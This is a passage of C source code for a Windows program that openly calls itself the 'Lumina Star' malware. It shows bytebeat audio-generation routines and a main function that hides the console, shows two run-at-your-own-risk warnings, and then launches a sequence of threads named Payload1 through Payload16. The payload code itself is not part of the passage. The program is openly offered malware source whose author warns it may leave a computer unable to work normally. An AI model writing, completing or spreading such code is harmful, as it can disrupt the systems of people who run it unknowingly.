	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 7999.99, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((tanf(((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t) * 129)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((100000 / ((t & 4095) + 1)) | int(tanf(t * (t >> 12 & 13 ^ 2 | t >> 10 & 9)) * 129)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat16() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(10000 / ((t & 4095) + 1) | (((t * (-t & 16384 ? 5 : 6) * (1 + (1 & t >> 1)) >> (1 & t >> 1)) & (t * (t & 16384 ? 6 : 5) * (4 - (3 & t >> 8)) >> (3 & -t >> (t & 4096 ? 2 : 15)))) * (1 & t >> 1) & (17 * t | (t >> 2) + (t & 32768 ? 78 : 91))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxA(NULL, "Warning! This program is a malware that known as 'Lumina Star'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the running. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Lumina Star.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to run this? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! LambdaTechnology(@LambdaTech-w3o) is NOT responsible for any damages caused by this malware!!!", L"Lumina Star.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			Sleep(5000);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5_num1 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, Payload5_num2, 0, 0, 0);
			HANDLE thread5_num3 = CreateThread(0, 0, Payload5_num3, 0, 0, 0);
			HANDLE thread5_num4 = CreateThread(0, 0, Payload5_num4, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			CloseHandle(thread5_num1);
			TerminateThread(thread5_num2, 0);
			CloseHandle(thread5_num2);
			TerminateThread(thread5_num3, 0);
			CloseHandle(thread5_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9_num1 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			HANDLE thread9_num2 = CreateThread(0, 0, Payload9_num2, 0, 0, 0);
			HANDLE thread9_num3 = CreateThread(0, 0, Payload9_num3, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9_num1, 0);
			CloseHandle(thread9_num1);
			TerminateThread(thread9_num2, 0);
			CloseHandle(thread9_num2);
			TerminateThread(thread9_num3, 0);
			CloseHandle(thread9_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10_num1 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			HANDLE thread10_num2 = CreateThread(0, 0, Payload10_num2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10_num1, 0);
			CloseHandle(thread10_num1);
			TerminateThread(thread10_num2, 0);
			CloseHandle(thread10_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11_num1 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			HANDLE thread11_num2 = CreateThread(0, 0, Payload11_num2, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11_num1, 0);
			CloseHandle(thread11_num1);
			TerminateThread(thread11_num2, 0);
			CloseHandle(thread11_num2);
			TerminateThread(thread5_num4, 0);
			CloseHandle(thread5_num4);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12_num1 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, Payload12_num2, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			CloseHandle(thread12_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14_num1 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			HANDLE thread14_num2 = CreateThread(0, 0, Payload14_num2, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14_num1, 0);
			CloseHandle(thread14_num1);
			TerminateThread(thread14_num2, 0);
			CloseHandle(thread14_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread15_num1 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			HANDLE thread15_num2 = CreateThread(0, 0, Payload15_num2, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread15_num1, 0);
			CloseHandle(thread15_num1);
			TerminateThread(thread15_num2, 0);
			CloseHandle(thread15_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread16 = CreateThread(0, 0, Payload16_num1, 0, 0, 0);
			bytebeat16();
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			TerminateThread(thread2_num2, 0);
			CloseHandle(thread2_num2);
			TerminateThread(thread12_num2, 0);
			CloseHandle(thread12_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
		}
	}
	return 0;
}
